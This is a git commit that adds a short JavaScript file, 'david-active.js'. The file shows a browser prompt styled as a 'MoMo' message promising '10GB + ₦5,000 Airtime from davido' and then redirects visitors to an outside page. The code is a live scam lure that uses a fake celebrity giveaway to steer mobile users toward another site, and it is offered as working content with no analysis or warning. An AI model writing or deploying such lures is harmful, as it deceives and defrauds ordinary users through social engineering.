3880668cf5672f4dc018b02f98eec554202bd38e
itidnewblog4 <ukpehaitid2@gmail.com>
2025-10-21 08:41:14 +0100

    Create david-active.js

---
+++ david-active.js
@@ -0,0 +1,5 @@
+var password = 'GET 10GB + ₦5,000 '
+password=prompt('MoMo: Congratulations, your mobile number is eligible to receive 10GB + ₦5,000 Airtime from davido, click OK to get yours now','GET 10GB + ₦5,000 ');
+if (password != 'GET 10GB + ₦5,000 ') {
+location.href='https://phlug.org/david.html';
+}
